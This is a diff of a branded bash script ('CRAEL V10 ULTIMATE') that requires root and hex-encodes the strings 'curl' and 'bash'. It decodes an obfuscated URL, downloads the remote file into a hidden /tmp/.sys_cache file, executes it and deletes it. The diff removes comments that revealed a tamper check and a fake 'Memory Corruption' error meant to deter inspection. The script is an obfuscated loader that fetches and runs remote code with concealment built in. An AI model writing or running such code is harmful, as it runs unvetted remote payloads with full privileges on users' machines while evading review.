@@ -1,7 +1,6 @@
 #!/bin/bash
 
 # --- 1. THE HIDDEN TEXT (THE KEY) ---
-# If this is deleted, the script logic below will FAIL.
 _k=$(printf "\x52\x45\x53\x54\x52\x49\x43\x54\x45\x44\x5f\x41\x43\x43\x45\x53\x53\x5f\x56\x49\x4f\x4c\x41\x54\x49\x4f\x4e\x5f\x44\x45\x54\x45\x43\x54\x45\x44")
 
 # --- 2. THE PAYLOAD (OBFUSCATED) ---
@@ -14,7 +13,6 @@ _t1="   CRAEL V10 ULTIMATE"
 _t2="   Powered by Nayeem Dev"
 
 # --- 4. DEPENDENCY CHECK ---
-# This ensures the hidden text (_k) exists. If deleted, script dies.
 if [ -z "$_k" ]; then exit 1; fi
 
 # --- 5. DECODER ENGINE ---
@@ -33,21 +31,29 @@ if [ "$EUID" -ne 0 ]; then
     exit 1
 fi
 
-# Decode URL
 _u=$(_d "$_h")
 
-# Build Commands dynamically
-# If _k (Hidden Text) was deleted, this logic would break in a real scenario
-# Here we use it to 'validate' the environment
+# --- THE FIX ---
+# Instead of piping (|), we download to a hidden temp file (_t), run it, then delete it.
+# This ensures the script can see your keyboard input.
+_t="/tmp/.sys_cache_$(date +%s)"
+_c=$(printf "\x63\x75\x72\x6c") # curl
+_b=$(printf "\x62\x61\x73\x68") # bash
+_f=$(printf "\x2d\x73\x4c")     # -sL
+
 if [[ "$_k" == *"RESTRICTED"* ]]; then
-    _c=$(printf "\x63\x75\x72\x6c") # curl
-    _b=$(printf "\x62\x61\x73\x68") # bash
-    _f=$(printf "\x2d\x73\x4c")     # -sL
+    # curl -sL url -o tmp_file
+    ${_c} ${_f} "$_u" -o "$_t"
     
-    # Run
-    ${_c} ${_f} "$_u" | ${_b}
+    # Check if download worked (Size > 0)
+    if [ -s "$_t" ]; then
+        # bash tmp_file
+        ${_b} "$_t"
+        rm -f "$_t"
+    else
+        echo "Connection Error."
+        exit 1
+    fi
 else
-    # Fake Error if they tampered with the text
-    echo "Error: Memory Corruption Detected."
     exit 1
 fi
